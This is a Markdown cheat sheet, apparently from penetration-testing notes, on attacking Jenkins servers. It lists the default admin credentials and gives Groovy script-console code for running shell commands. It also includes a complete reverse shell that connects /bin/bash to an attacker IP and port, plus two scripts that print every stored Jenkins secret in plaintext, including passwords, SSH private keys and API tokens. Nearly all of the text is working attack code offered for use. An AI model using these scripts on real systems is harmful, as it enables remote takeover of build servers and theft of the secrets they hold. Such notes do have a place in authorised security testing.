## Jenkins

Default user name and password
> admin:password


### Groovy scripts 

#### Command Execution

```
def proc = "whoami".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

Multiline shell command that can include pipes, redirects and stuff:
> def proc = ['bash', '-c', '''your_long_command_here'''].execute();

#### reverse shell

```
String host="10.10.14.17";
int port=4444;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### others
You can dump all the secrets from the Groovy Script console in /script running this code

```
// From https://www.dennisotugo.com/how-to-view-all-jenkins-secrets-credentials/
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
import org.jenkinsci.plugins.plaincredentials.StringCredentials
import org.jenkinsci.plugins.plaincredentials.impl.FileCredentialsImpl

def showRow = { credentialType, secretId, username = null, password = null, description = null ->
println("${credentialType} : ".padLeft(20) + secretId?.padRight(38)+" | " +username?.padRight(20)+" | " +password?.padRight(40) + " | " +description)
}

// set Credentials domain name (null means is it global)
domainName = null

credentialsStore = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]?.getStore()
domain = new Domain(domainName, null, Collections.<DomainSpecification>emptyList())

credentialsStore?.getCredentials(domain).each{
if(it instanceof UsernamePasswordCredentialsImpl)
showRow("user/password", it.id, it.username, it.password?.getPlainText(), it.description)
else if(it instanceof BasicSSHUserPrivateKey)
showRow("ssh priv key", it.id, it.passphrase?.getPlainText(), it.privateKeySource?.getPrivateKey()?.getPlainText(), it.description)
else if(it instanceof StringCredentials)
showRow("secret text", it.id, it.secret?.getPlainText(), '', it.description)
else if(it instanceof FileCredentialsImpl)
showRow("secret file", it.id, it.content?.text, '', it.description)
else
showRow("something else", it.id, '', '', '')
}

return
```

```
import java.nio.charset.StandardCharsets;
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
      com.cloudbees.plugins.credentials.Credentials.class
)

for (c in creds) {
  println(c.id)
  if (c.properties.description) {
    println("   description: " + c.description)
  }
  if (c.properties.username) {
    println("   username: " + c.username)
  }
  if (c.properties.password) {
    println("   password: " + c.password)
  }
  if (c.properties.passphrase) {
    println("   passphrase: " + c.passphrase)
  }
  if (c.properties.secret) {
    println("   secret: " + c.secret)
  }
  if (c.properties.secretBytes) {
    println("    secretBytes: ")
    println("\n" + new String(c.secretBytes.getPlainData(), StandardCharsets.UTF_8))
    println("")
  }
  if (c.properties.privateKeySource) {
    println("   privateKey: " + c.getPrivateKey())
  }
  if (c.properties.apiToken) {
    println("   apiToken: " + c.apiToken)
  }
  if (c.properties.token) {
    println("   token: " + c.token)
  }
  println("")
}
```